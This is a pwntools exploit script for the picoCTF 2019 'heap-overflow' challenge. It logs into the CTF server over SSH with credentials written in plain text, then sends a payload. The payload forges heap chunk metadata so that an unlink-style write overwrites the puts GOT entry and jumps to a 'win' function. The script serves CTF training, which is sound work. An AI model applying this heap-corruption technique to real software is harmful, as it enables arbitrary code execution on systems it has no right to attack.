from pwn import *
import sys

context.clear(os='linux')#, log_level='debug')

argv = sys.argv
binary_path = './vuln'
REMOTE = False
DEBUG = False

if len(argv) > 1:
	if argv[1] == 'remote':
		REMOTE = True
	if argv[1] == 'debug':
		DEBUG = True

if REMOTE:
	s = ssh(host='2019shell1.picoctf.com', user='yuvalyoBlup', password='123456789')
	sh = s.process([binary_path], cwd='/problems/heap-overflow_2_de0f6daa62288c9b3afb950888dc7166')
else:
	sh = process([binary_path])

if DEBUG:
	gdb.attach(sh, '''
		b* main
		''')

e = ELF(binary_path)

# ------------- plan -----------
# overwrite next chunks metadata to think that he is free
# overwrite GOT entrence with shellcode


sh.recvuntil('Oops! a new developer copy pasted and printed an address as a decimal...\n')
leak = int(sh.recvline()[:-1])
log.info('leak: {}'.format(leak))

shellcode = asm('jmp l1; nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop; l1: push {}; ret;'.format(hex(e.symbols["win"])))
log.info("shellcode:\n{}".format(hexdump(shellcode)))

any_even_value = 100
payload = shellcode + ('B' * (664 - len(shellcode))) + p32(any_even_value) + p32(-4, sign='signed') \
			+ p32(e.got['puts'] - 12) + p32(leak)
log.info('payload:\n{}'.format(hexdump(payload)))

sh.sendlineafter('Input fullname', payload)
sh.sendlineafter('Input lastname', 'a')

print sh.recvall()




